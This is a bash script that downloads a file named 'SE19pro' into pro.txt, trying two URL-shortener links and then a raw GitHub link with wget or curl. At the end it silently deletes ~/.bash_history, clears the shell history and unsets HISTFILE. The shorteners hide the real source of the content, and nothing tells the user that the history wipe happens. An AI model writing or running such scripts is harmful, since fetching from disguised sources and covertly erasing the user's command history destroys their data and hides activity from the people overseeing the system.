#!/bin/bash
clear
download_success=false

if command -v wget &> /dev/null; then
    # Using wget: try three different links
    if wget -qO - https://naturl.link/se19pro >> pro.txt; then
        download_success=true
    elif wget -qO - https://v.gd/se19pro >> pro.txt; then
        download_success=true
    elif wget -qO - https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt >> pro.txt; then
        download_success=true
    fi
elif command -v curl &> /dev/null; then
    # Using curl as fallback: try three different links
    if curl -fsSL https://naturl.link/se19pro >> pro.txt; then
        download_success=true
    elif curl -fsSL https://v.gd/se19pro >> pro.txt; then
        download_success=true
    elif curl -fsSL https://raw.githubusercontent.com/mastercodin/stunning-enigma/refs/heads/main/SE19pro.txt >> pro.txt; then
        download_success=true
    fi
else
    echo "Neither wget nor curl is installed. Cannot download the file."
fi

if [ "$download_success" = true ]; then
    echo "COMMAND SUCCESSFULLY EXECUTED!"
else
    echo "Looks like there is no internet or the command failed to execute."
fi

# Clean up bash history
clear
rm -f ~/.bash_history && history -c && unset HISTFILE
clear
exit
